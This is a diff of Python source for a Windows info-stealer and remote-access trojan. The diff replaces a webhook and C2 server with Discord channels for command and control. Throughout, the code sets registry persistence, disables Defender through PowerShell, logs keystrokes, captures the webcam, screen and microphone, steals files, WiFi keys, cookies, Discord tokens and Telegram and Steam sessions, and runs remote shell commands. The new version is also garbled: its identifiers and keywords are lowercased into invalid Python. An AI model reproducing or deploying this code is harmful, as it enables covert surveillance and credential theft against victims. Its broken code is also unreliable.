@@ -1,329 +1,342 @@
-import os, sys, json, base64, urllib.request, re, ctypes, subprocess, time, threading, shutil, fnmatch, zipfile, sqlite3, winreg, platform, getpass, tempfile, hashlib
+import os,sys,json,base64,re,ctypes,subprocess,time,threading,shutil,fnmatch,zipfile,sqlite3,winreg,platform
 from datetime import datetime
-from pathlib import Path
+from pathlib import path
 import requests
-from Crypto.Cipher import AES
-from PIL import ImageGrab
-import pyaudio, wave, cv2, win32crypt, psutil
+from crypto.cipher import aes
+from pil import imagegrab
+import pyaudio,wave,cv2,win32crypt,psutil
 
 if os.name != "nt":
     sys.exit(0)
 
-CONFIG = {}
+config = {}
 
-LOCAL = os.getenv("LOCALAPPDATA", "")
-ROAMING = os.getenv("APPDATA", "")
-TEMP = os.getenv("TEMP", "")
-USERNAME = os.getenv("USERNAME", "")
-COMPUTER = os.environ.get("COMPUTERNAME", "unknown")
-VICTIM_ID = f"{COMPUTER}_{USERNAME}"
+bottoken = config.get("bottoken")
+commandchan = config.get("commandchan")
+exfilchan = config.get("exfilchan")
 
-def exfiltrate(data, filename=None):
-    if CONFIG.get("webhook"):
-        try:
-            if filename:
-                requests.post(CONFIG["webhook"], files={"file": (filename, open(filename, "rb"))}, timeout=10)
-            else:
-                requests.post(CONFIG["webhook"], json={"content": data}, timeout=10)
-        except:
-            pass
+username = os.getenv("username", "")
+computername = os.environ.get("computername", "unknown")
+victimid = f"{computername}_{username}"
 
-def send_to_c2(endpoint, data):
-    try:
-        url = f"{CONFIG['c2_url']}/{endpoint}"
-        headers = {"User-Agent": "Mozilla/5.0", "X-Victim": VICTIM_ID}
-        requests.post(url, json=data, headers=headers, timeout=10)
-    except:
-        pass
+def discordapi(endpoint, method="get", data=none, files=none):
+    url = f"https://discord.com/api/v10/{endpoint}"
+    headers = {"authorization": f"bot {bottoken}", "user-agent": "mozilla/5.0"}
+    if method == "get":
+        return requests.get(url, headers=headers)
+    elif method == "post":
+        if files:
+            return requests.post(url, headers=headers, data=data, files=files)
+        else:
+            return requests.post(url, headers=headers, json=data)
 
-def get_system_info():
+def sendexfil(content=none, filename=none):
+    data = {"content": content} if content else {}
+    files = none
+    if filename:
+        files = {"file": (filename, open(filename, "rb"))}
+        data = {"content": f"file:{victimid}"}
+    discordapi(f"channels/{exfilchan}/messages", "post", data=data, files=files)
+
+def getsysteminfo():
     return {
-        "user": USERNAME,
-        "computer": COMPUTER,
+        "user": username,
+        "computer": computername,
         "os": platform.platform(),
         "cpu": platform.processor(),
-        "ram": str(round(psutil.virtual_memory().total / (1024**3), 2)) + " GB",
+        "ram": str(round(psutil.virtual_memory().total / (1024**3), 2)) + " gb",
         "ip": requests.get("https://api.ipify.org", timeout=5).text,
         "timestamp": datetime.now().isoformat()
     }
 
-def add_persistence():
-    if not CONFIG.get("persist"):
+def addpersist():
+    if not config.get("persist"):
         return
     try:
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
+        key = winreg.hkey_current_user
+        subkey = r"software\microsoft\windows\currentversion\run"
+        with winreg.openkey(key, subkey, 0, winreg.key_set_value) as regkey:
+            winreg.setvalueex(regkey, "windowsupdate", 0, winreg.reg_sz, sys.executable)
     except:
         pass
 
-def disable_defender():
-    if not CONFIG.get("disable_defender"):
+def disabledefender():
+    if not config.get("disabledefender"):
         return
-    cmds = ["Set-MpPreference -DisableRealtimeMonitoring $true", "Set-MpPreference -DisableBehaviorMonitoring $true", "Set-MpPreference -DisableBlockAtFirstSeen $true", "Set-MpPreference -DisableIOAVProtection $true", "Set-MpPreference -DisablePrivacyMode $true", "Set-MpPreference -SignatureDisableUpdate $true", "Add-MpPreference -ExclusionPath \"C:\\\""]
+    cmds = ["set-mppreference -disablerealtimemonitoring $true","set-mppreference -disablebehaviormonitoring $true",
+            "set-mppreference -disableblockatfirstseen $true","set-mppreference -disableioavprotection $true",
+            "set-mppreference -disableprivacymode $true","set-mppreference -signaturedisableupdate $true",
+            "add-mppreference -exclusionpath \"c:\\\""]
     for cmd in cmds:
-        subprocess.run(["powershell", "-WindowStyle", "Hidden", cmd], capture_output=True)
+        subprocess.run(["powershell", "-windowstyle", "hidden", cmd], capture_output=true)
 
-def keylogger():
-    if not CONFIG.get("keylog"):
+def keylog():
+    if not config.get("keylog"):
         return
     from ctypes import *
     from ctypes.wintypes import *
-    WH_KEYBOARD_LL = 13
-    WM_KEYDOWN = 0x0100
-    log_file = os.path.expandvars("%APPDATA%\\keys.log")
-    def hook_proc(nCode, wParam, lParam):
-        if wParam == WM_KEYDOWN:
-            with open(log_file, "a") as f:
-                f.write(chr(lParam[0]))
-            if os.path.getsize(log_file) > 500:
-                exfiltrate(open(log_file).read())
-                open(log_file, "w").close()
-        return CallNextHookEx(None, nCode, wParam, lParam)
-    hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, None, 0)
-    msg = MSG()
-    while GetMessageW(byref(msg), None, 0, 0):
-        TranslateMessage(byref(msg))
-        DispatchMessageW(byref(msg))
+    wh_keyboard_ll = 13
+    wm_keydown = 0x0100
+    logfile = os.path.expandvars("%appdata%\\keys.log")
+    def hookproc(ncode, wparam, lparam):
+        if wparam == wm_keydown:
+            with open(logfile, "a") as f:
+                f.write(chr(lparam[0]))
+            if os.path.getsize(logfile) > 500:
+                sendexfil(content=open(logfile).read())
+                open(logfile, "w").close()
+        return callnexthookex(none, ncode, wparam, lparam)
+    hook = setwindowshookexw(wh_keyboard_ll, hookproc, none, 0)
+    msg = msg()
+    while getmessagew(byref(msg), none, 0, 0):
+        translatemessage(byref(msg))
+        dispatchmessagew(byref(msg))
 
-def webcam_capture():
-    if not CONFIG.get("webcam"):
+def webcamshot():
+    if not config.get("webcam"):
         return
     try:
-        cam = cv2.VideoCapture(0)
+        cam = cv2.videocapture(0)
         ret, frame = cam.read()
         if ret:
             cv2.imwrite("webcam.jpg", frame)
-            exfiltrate(None, "webcam.jpg")
+            sendexfil(filename="webcam.jpg")
         cam.release()
     except:
         pass
 
-def take_screenshot():
-    if not CONFIG.get("screenshot"):
+def screenshot():
+    if not config.get("screenshot"):
         return
-    img = ImageGrab.grab()
+    img = imagegrab.grab()
     img.save("screenshot.png")
-    exfiltrate(None, "screenshot.png")
+    sendexfil(filename="screenshot.png")
 
-def screen_recording():
-    if not CONFIG.get("screenrec"):
+def screenrec():
+    if not config.get("screenrec"):
         return
-    duration = CONFIG.get("record_seconds", 30)
+    duration = config.get("recordseconds", 30)
     import pyautogui, numpy as np
     size = pyautogui.size()
-    fourcc = cv2.VideoWriter_fourcc(*"XVID")
-    out = cv2.VideoWriter("recording.avi", fourcc, 20.0, size)
+    fourcc = cv2.videowriter_fourcc(*"xvid")
+    out = cv2.videowriter("recording.avi", fourcc, 20.0, size)
     start = time.time()
     while time.time() - start < duration:
         frame = np.array(pyautogui.screenshot())
-        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        frame = cv2.cvtcolor(frame, cv2.color_bgr2rgb)
         out.write(frame)
         time.sleep(0.05)
     out.release()
-    exfiltrate(None, "recording.avi")
+    sendexfil(filename="recording.avi")
 
-def mic_recording():
-    if not CONFIG.get("mic"):
+def micrecord():
+    if not config.get("mic"):
         return
-    duration = CONFIG.get("record_seconds", 30)
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 44100
-    p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-    frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]
+    duration = config.get("recordseconds", 30)
+    chunk = 1024
+    fmt = pyaudio.paint16
+    channels = 1
+    rate = 44100
+    p = pyaudio.pyaudio()
+    stream = p.open(format=fmt, channels=channels, rate=rate, input=true, frames_per_buffer=chunk)
+    frames = [stream.read(chunk) for _ in range(0, int(rate / chunk * duration))]
     stream.stop_stream()
     stream.close()
     p.terminate()
     with wave.open("mic.wav", 'wb') as wf:
-        wf.setnchannels(CHANNELS)
-        wf.setsampwidth(p.get_sample_size(FORMAT))
-        wf.setframerate(RATE)
+        wf.setnchannels(channels)
+        wf.setsampwidth(p.get_sample_size(fmt))
+        wf.setframerate(rate)
         wf.writeframes(b''.join(frames))
-    exfiltrate(None, "mic.wav")
+    sendexfil(filename="mic.wav")
 
-def search_and_exfil():
-    if not CONFIG.get("file_search"):
+def searchfiles():
+    if not config.get("filesearch"):
         return
-    exts = CONFIG.get("file_exts", ".txt,.doc,.pdf").split(",")
-    max_size = CONFIG.get("max_file_size_mb", 10) * 1024 * 1024
+    exts = config.get("fileexts", ".txt,.doc,.pdf").split(",")
+    maxsize = config.get("maxfilesizemb", 10) * 1024 * 1024
     found = []
-    for root, _, files in os.walk("C:\\Users"):
+    for root, _, files in os.walk("c:\\users"):
         for ext in exts:
             for f in fnmatch.filter(files, "*"+ext):
                 full = os.path.join(root, f)
-                if os.path.getsize(full) <= max_size:
+                if os.path.getsize(full) <= maxsize:
                     found.append(full)
     if found:
-        zip_name = "stolen_files.zip"
-        with zipfile.ZipFile(zip_name, 'w') as zf:
+        zipname = "stolen_files.zip"
+        with zipfile.zippfile(zipname, 'w') as zf:
             for f in found[:50]:
                 zf.write(f, os.path.basename(f))
-        exfiltrate(None, zip_name)
+        sendexfil(filename=zipname)
 
-def steal_wifi():
-    if not CONFIG.get("wifi"):
+def stealwifi():
+    if not config.get("wifi"):
         return
     try:
-        results = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
-        profiles = re.findall(r"All User Profile\s*:\s(.*)", results)
-        wifi_data = []
-        for p in profiles:
-            data = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"], capture_output=True, text=True).stdout
-            key = re.search(r"Key Content\s*:\s(.*)", data)
-            wifi_data.append({"ssid": p, "password": key.group(1) if key else None})
-        exfiltrate(json.dumps(wifi_data, indent=2))
+        res = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=true, text=true).stdout
+        profs = re.findall(r"all user profile\s*:\s(.*)", res)
+        data = []
+        for p in profs:
+            out = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"], capture_output=true, text=true).stdout
+            key = re.search(r"key content\s*:\s(.*)", out)
+            data.append({"ssid": p, "password": key.group(1) if key else none})
+        sendexfil(content=json.dumps(data, indent=2))
     except:
         pass
 
-def clipboard_logger():
-    if not CONFIG.get("clipboard"):
+def clipmonitor():
+    if not config.get("clipboard"):
         return
     import win32clipboard
     last = ""
-    while True:
+    while true:
         try:
-            win32clipboard.OpenClipboard()
-            data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
+            win32clipboard.openclipboard()
+            data = win32clipboard.getclipboarddata()
+            win32clipboard.closeclipboard()
             if data and data != last:
                 last = data
-                exfiltrate(f"Clipboard: {data}")
+                sendexfil(content=f"clipboard: {data}")
         except:
             pass
         time.sleep(2)
 
-def browser_history():
-    if not CONFIG.get("history"):
+def browserhist():
+    if not config.get("history"):
         return
-    history_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\History"
-    if os.path.exists(history_path):
-        shutil.copy2(history_path, "history.db")
-        exfiltrate(None, "history.db")
+    hist = os.getenv("localappdata", "") + "\\google\\chrome\\user data\\default\\history"
+    if os.path.exists(hist):
+        shutil.copy2(hist, "history.db")
+        sendexfil(filename="history.db")
 
-def steal_telegram():
-    if not CONFIG.get("telegram"):
+def stealtelegram():
+    if not config.get("telegram"):
         return
-    tdata = ROAMING + "\\Telegram Desktop\\tdata"
+    tdata = os.getenv("appdata", "") + "\\telegram desktop\\tdata"
     if os.path.exists(tdata):
         shutil.make_archive("telegram", "zip", tdata)
-        exfiltrate(None, "telegram.zip")
+        sendexfil(filename="telegram.zip")
 
-def steal_steam():
-    if not CONFIG.get("steam"):
+def stealsteam():
+    if not config.get("steam"):
         return
-    for f in Path(ROAMING).glob("**/ssfn*"):
-        exfiltrate(None, str(f))
+    for f in path(os.getenv("appdata", "")).glob("**/ssfn*"):
+        sendexfil(filename=str(f))
 
-def discord_tokens_cookies_roblox():
-    if not CONFIG.get("tokens"):
+def stealalldata():
+    if not config.get("tokens"):
         return
-    PATHS = {
-        'Discord': ROAMING + '\\discord',
-        'Discord Canary': ROAMING + '\\discordcanary',
-        'Discord PTB': ROAMING + '\\discordptb',
-        'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
-        'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
-        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
+    local = os.getenv("localappdata", "")
+    roaming = os.getenv("appdata", "")
+    paths = {
+        'discord': roaming + '\\discord',
+        'discordcanary': roaming + '\\discordcanary',
+        'discordptb': roaming + '\\discordptb',
+        'chrome': local + "\\google\\chrome\\user data\\default",
+        'edge': local + '\\microsoft\\edge\\user data\\default',
+        'brave': local + '\\bravesoftware\\brave-browser\\user data\\default'
     }
     checked = []
     results = {"tokens": []}
-    for platform, path in PATHS.items():
+    for platform, path in paths.items():
         if not os.path.exists(path):
             continue
         try:
-            with open(path + "\\Local State", "r") as f:
+            with open(path + "\\local state", "r") as f:
                 key = json.load(f)['os_crypt']['encrypted_key']
         except:
             continue
-        ldb_path = path + "\\Local Storage\\leveldb\\"
-        if not os.path.exists(ldb_path):
+        ldbpath = path + "\\local storage\\leveldb\\"
+        if not os.path.exists(ldbpath):
             continue
-        for file in os.listdir(ldb_path):
+        for file in os.listdir(ldbpath):
             if not file.endswith((".ldb", ".log")):
                 continue
-            with open(ldb_path + file, "r", errors="ignore") as f:
+            with open(ldbpath + file, "r", errors="ignore") as f:
                 content = f.read()
-                for match in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", content):
+                for match in re.findall(r"dqw4w9wgxcq:[^\"\\s]*", content):
                     try:
                         enc = base64.b64decode(match.split(':')[1])
-                        dec_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
-                        cipher = AES.new(dec_key, AES.MODE_GCM, enc[3:15])
+                        deckey = win32crypt.cryptunprotectdata(base64.b64decode(key)[5:], none, none, none, 0)[1]
+                        cipher = aes.new(deckey, aes.mode_gcm, enc[3:15])
                         token = cipher.decrypt(enc[15:])[:-16].decode()
                         if token and token not in checked:
                             checked.append(token)
-                            req = requests.get('https://discord.com/api/v10/users/@me', headers={"Authorization": token})
+                            req = requests.get('https://discord.com/api/v10/users/@me', headers={"authorization": token})
                             if req.status_code == 200:
                                 user = req.json()
                                 results["tokens"].append({"token": token, "username": user.get("username"), "id": user.get("id"), "email": user.get("email")})
                     except:
                         pass
     if results["tokens"]:
-        exfiltrate(json.dumps(results, indent=2))
-    cookie_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\Cookies"
-    if os.path.exists(cookie_path):
-        shutil.copy2(cookie_path, "cookies.db")
-        exfiltrate(None, "cookies.db")
-    for f in Path(LOCAL).glob("Roblox\\LocalStorage\\*.json"):
+        sendexfil(content=json.dumps(results, indent=2))
+    cookiepath = local + "\\google\\chrome\\user data\\default\\cookies"
+    if os.path.exists(cookiepath):
+        shutil.copy2(cookiepath, "cookies.db")
+        sendexfil(filename="cookies.db")
+    for f in path(local).glob("roblox\\localstorage\\*.json"):
         with open(f, "r") as rf:
-            if ".ROBLOSECURITY" in rf.read():
-                exfiltrate(None, str(f))
+            if ".robolsecurity" in rf.read():
+                sendexfil(filename=str(f))
 
 def heartbeat():
-    while True:
-        send_to_c2("heartbeat", {"victim_id": VICTIM_ID, "last_seen": datetime.now().isoformat()})
+    while true:
+        sendexfil(content=f"heartbeat:{victimid}")
         time.sleep(60)
 
-def command_poller():
-    last_cmd_id = 0
-    while True:
+def cmdloop():
+    lastid = 0
+    while true:
         try:
-            resp = requests.get(f"{CONFIG['c2_url']}/poll/{VICTIM_ID}", timeout=30)
-            if resp.status_code == 200:
-                cmd = resp.json()
-                if cmd.get("id") and cmd["id"] > last_cmd_id:
-                    last_cmd_id = cmd["id"]
-                    command = cmd["command"]
-                    if command.lower() == "exit":
-                        break
-                    elif command.lower().startswith("download "):
-                        filepath = command[9:]
-                        if os.path.exists(filepath):
-                            files = {"file": open(filepath, "rb")}
-                            requests.post(f"{CONFIG['c2_url']}/upload/{VICTIM_ID}", files=files)
-                    else:
-                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
-                        requests.post(f"{CONFIG['c2_url']}/result/{VICTIM_ID}", json={"cmd_id": cmd["id"], "output": output.stdout + output.stderr})
-            time.sleep(CONFIG.get("poll_interval", 30))
+            url = f"https://discord.com/api/v10/channels/{commandchan}/messages?limit=1"
+            headers = {"authorization": f"bot {bottoken}"}
+            res = requests.get(url, headers=headers)
+            if res.status_code == 200:
+                msgs = res.json()
+                if msgs:
+                    msg = msgs[0]
+                    if msg.get("id") and int(msg["id"]) > lastid:
+                        lastid = int(msg["id"])
+                        content = msg.get("content", "")
+                        if content.startswith(f"cmd:{victimid}:"):
+                            cmd = content.split(":",2)[2]
+                            if cmd.lower() == "exit":
+                                break
+                            elif cmd.lower().startswith("download "):
+                                filepath = cmd[9:]
+                                if os.path.exists(filepath):
+                                    sendexfil(filename=filepath)
+                            else:
+                                output = subprocess.run(cmd, shell=true, capture_output=true, text=true)
+                                result = output.stdout + output.stderr
+                                sendexfil(content=f"result:{victimid}:{result[:1900]}")
+            time.sleep(config.get("pollinterval", 30))
         except:
             time.sleep(30)
 
-def run_threaded(target):
-    t = threading.Thread(target=target, daemon=True)
+def runthreaded(target):
+    t = threading.thread(target=target, daemon=true)
     t.start()
 
 def main():
-    add_persistence()
-    disable_defender()
-    send_to_c2("register", get_system_info())
-    run_threaded(heartbeat)
-    run_threaded(keylogger)
-    run_threaded(webcam_capture)
-    take_screenshot()
-    run_threaded(screen_recording)
-    run_threaded(mic_recording)
-    search_and_exfil()
-    steal_wifi()
-    run_threaded(clipboard_logger)
-    browser_history()
-    steal_telegram()
-    steal_steam()
-    discord_tokens_cookies_roblox()
-    run_threaded(command_poller)
-    while True:
+    addpersist()
+    disabledefender()
+    sendexfil(content=f"register:{victimid}:{json.dumps(getsysteminfo())}")
+    runthreaded(heartbeat)
+    runthreaded(keylog)
+    runthreaded(webcamshot)
+    screenshot()
+    runthreaded(screenrec)
+    runthreaded(micrecord)
+    searchfiles()
+    stealwifi()
+    runthreaded(clipmonitor)
+    browserhist()
+    stealtelegram()
+    stealsteam()
+    stealalldata()
+    runthreaded(cmdloop)
+    while true:
         time.sleep(60)
 
 if __name__ == "__main__":
